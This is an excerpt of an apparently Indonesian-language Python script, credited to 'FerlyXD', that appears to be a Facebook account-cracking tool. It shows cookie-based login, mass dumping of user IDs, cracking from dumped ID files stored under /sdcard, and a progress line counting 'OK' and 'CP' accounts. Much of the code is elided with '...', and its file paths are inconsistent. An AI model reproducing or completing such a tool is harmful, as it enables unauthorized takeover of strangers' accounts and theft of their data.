...
def banner():
	clear()
	wel = '# Selamat Datang,Author:FerlyXD Jangan Lupa Bersyukur'
	wel2 = mark(wel, style='green')
	sol().print(wel2)
	au='   ••• Recode By: FerlyXD••• Github :Gk Punya ••• \n  _____   ______ _______ _______ _____ _     _ _______ \n |_____] |_____/ |______ |  |  |   |   |     | |  |  |   \n |       |    \_ |______ |  |  | __|__ |_____| |  |  | Recode By:FerlyXD'                                             
...
def login_lagi334():
	try:
		...
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....Tumbal kamu udah meninggal !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies kamu udah jelek ganti ya ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'github.com/FERLYXD'
	cetak(nel('\tSelamat Datang  [yellow]%s[white] Sayang Ferly'%(my_name)))
...
def dump_massal():
	...
	try:
		...
		print('╚═ Masukkan Angka Sayang, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('╚═ Gagal Dump Id ')
		exit()
	...
	for userr in uid:
		try:
			...
			print('╚═ Sinyal kamu kurang bagus ')
			exit()
	try:
		print('╠═')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/Fanz_Dump')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/Fanz/Dump'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/Fanz/Dump/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	if hc in ['1','01']:
		...
		print(' ╚═ Pilih Yang Bener Dong Sayang😘')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [FERLYXD] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{x}  {P}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x} ➞ {h}Ferly jangan lupa sama Tuhan ya\n\t{x} ➞ {h}Ferly kamu ganteng baik lagi \n\t{x} ➞ {h}Ferly sayang kalian semua \n\t{x} ➞ {h}Ferly sebelum crack doa dulu\n\t{x} ➞ {h}Ferly kamu hanya manusia biasa{x}')
	time.sleep(3)
	login()
